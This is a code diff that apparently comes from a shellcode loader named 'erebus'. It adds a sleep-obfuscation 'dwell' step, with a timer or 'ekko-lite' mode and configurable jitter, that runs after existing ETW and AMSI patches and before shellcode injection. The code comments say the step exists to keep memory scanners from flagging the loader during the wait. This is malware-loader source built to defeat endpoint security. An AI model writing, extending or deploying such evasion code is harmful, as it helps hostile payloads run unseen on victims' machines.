@@ -3,6 +3,7 @@
 #include "../include/shellcode_optional.hpp"
 #include "../include/config.hpp"
 #include "../include/evasion/evasion.hpp"
+#include "../include/evasion/sleep_obfuscation.hpp"
 
 VOID entry(void)
 {
@@ -10,6 +11,21 @@ VOID entry(void)
 	// EVASION PATCHES - run before any shellcode processing
 	// ============================================================
 	erebus::evasion::RunEvasionPatches();
+
+	// ============================================================
+	// PRE-INJECTION DWELL (sleep obfuscation)
+	// Runs after ETW/AMSI patches so memory-scanner events during
+	// the wait window are suppressed. Controlled by:
+	//   CONFIG_SLEEP_OBFUSCATION_TYPE  (0=off, 1=timer, 2=ekko-lite)
+	//   CONFIG_SLEEP_OBFUSCATION_BASE_MS / CONFIG_SLEEP_OBFUSCATION_JITTER_MS
+	// ============================================================
+	#if CONFIG_SLEEP_OBFUSCATION_TYPE > 0
+		erebus::evasion::ObfuscatedDwell(
+			CONFIG_SLEEP_OBFUSCATION_BASE_MS,
+			CONFIG_SLEEP_OBFUSCATION_JITTER_MS
+		);
+	#endif
+
 	// ============================================================
 	// GUARDRAILS CHECK
 	// ============================================================
